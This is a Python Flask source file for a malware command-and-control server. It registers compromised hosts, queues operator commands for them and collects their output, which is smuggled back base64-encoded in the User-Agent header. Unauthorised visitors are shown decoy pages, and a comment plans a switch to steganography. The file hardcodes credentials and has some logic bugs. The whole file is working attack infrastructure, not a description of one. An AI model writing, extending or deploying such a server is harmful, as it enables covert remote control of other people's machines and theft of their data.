from sqlalchemy import desc, func
from flask_sqlalchemy import SQLAlchemy
from flaskext.mysql import MySQL
from flask import Flask, render_template, request, url_for, redirect
import flask_login
import base64
import os

app = Flask(__name__)


if os.path.exists('database/c2.db'):
    pass
else:
    os.mknod("database/c2.db")

username = "pogChamp"
password = "BestC2Ever"
server = "localhost"

authToken = "areTheyDeadYet"

app.config["SQLALCHEMY_DATABASE_URI"] = "mysql+mysqlconnector://{}:{}@{}/c2".format(
    username, password, server)
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['TEMPLATES_AUTO_RELOAD'] = True


login_manager = flask_login.LoginManager()
login_manager.init_app(app)


db = SQLAlchemy(app)

password = 'Bobobo'


def main():
    size_db = os.path.getsize("database/c2.db")


class Command(db.Model):

    id = db.Column(db.Integer, primary_key=True)
    cmd = db.Column(db.String(4096))
    done = db.Column(db.Boolean)


class Results(db.Model):

    id = db.Column(db.Integer, primary_key=True)
    results = db.Column(db.String(4096))


class Users(db.Model):

    username = db.Column(db.String(64), primary_key=True)


class Agents(db.Model):

    guid = db.Column(db.String(64), primary_key=True)
    user = db.Column(db.String(256))
    computer = db.Column(db.String(256))


def getUserList():
    return Users.query.all()


@login_manager.user_loader
def user_loader(username):
    users = getUserList()
    if not(username) or username not in str(users):
        return
    user = Users()
    user.username = username
    return user


@login_manager.request_loader
def request_loader(request):
    users = getUserList()
    email = request.form.get('username')
    if not(username) or username not in str(users):
        return
    user = Users()
    user.username = username
    user.is_authenticated = request.form['password'] == password
    return user


@app.route('/home')
@flask_login.login_required
def home():
    if len(Results.query.all()) == 0:
        return render_template('index.html', returns=' \n ')
    else:
        get_returns = Results.query.order_by(desc(Results.id))
        get_commands = Command.query.all()
        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
            return render_template('index.html',
                                   returns=get_returns[0].results,
                                   commands=get_commands)
        else:
            return render_template('redir.html')


@app.route('/register')
def register():
    guid = request.args.get('guid')
    user = request.args.get('user')
    computer = request.args.get('computer')
    save_agent = Agents(guid=guid, user=user, computer=computer)
    db.session.add(save_agent)
    db.session.commit()
    return render_template('register.html')

# TODO CHANGE THIS FUNCTION TO WORK WITH STEGANOGRAPHY
# NOTE WE WILL PROBABLY HAVE TO CHANGE THE SQL DATABASE WITH THIS, TOO


@app.route('/commands')
def getCommand():
    secretkey = request.args.get('key')
    guid = request.args.get('guid')
    if secretkey == password:
        result = request.headers.get('User-Agent').split('|')
        if len(result) >= 2:
            result_command = base64.b64decode(result[1]).decode('utf-8')
            id_command = result[2].split(',')[0]

            save_results = Results(results=result_command)
            db.session.add(save_results)
            command_done = \
                Command.query.filter_by(id=int(id_command)).first()
            command_done.done = not command_done.done
            db.session.commit()
        task_queue = Command.query.all()
        return render_template('commands.html', task_queue=task_queue)
    else:
        return render_template('redir.html')


@app.route('/create-task', methods=['POST'])
@flask_login.login_required
def create():
    new_task = Command(cmd=request.form['content'], done=False)
    db.session.add(new_task)
    db.session.commit()
    return redirect(url_for('home'))


@app.route('/delete/<id>')
def delete(id):
    Command.query.filter_by(id=int(id)).delete()
    db.session.commit()
    return redirect(url_for('home'))


@app.route('/')
def authenticate():
    auth = request.args.get('auth')
    # ensure that the user accessing the page should be here
    if auth != authToken:
        return render_template('redir.html')
    else:
        return render_template('login.html', auth=auth)


@app.route('/login', methods=['GET', 'POST'])
def login():
    # ensure that the user accessing the page should be here
    auth = request.form['authorization']
    if auth != authToken:
        print("[!] auth failed")
        return render_template('redir.html')

    # tru to get the necessary login info
    try:
        username = request.form['username']
        uPassword = request.form['password']
    except:
        print("[!] couldn't find all tokens")
        return render_template('redir.html')

    # print("*** before check")
    check_user = Users.query.filter_by(username=username).first()

    if uPassword == password:
        if check_user != None:
            if check_user.username != username:
                new_user = Users(username=username)
                db.session.add(new_user)
                db.session.commit()

        user = Users()
        user.username = username
        flask_login.login_user(user)
        # bring the user to the home page
        print("** before redirect to home")
        return redirect(url_for('home'))

    # information did not match
    print("****** before redir.html")
    return render_template('redir.html')


@app.route('/logout')
@flask_login.login_required
def logout():
    flask_login.logout_user()
    return redirect(url_for('home', auth=authToken))


if __name__ == '__main__':
    main()
    app.run(debug=False)
    db.create_all()
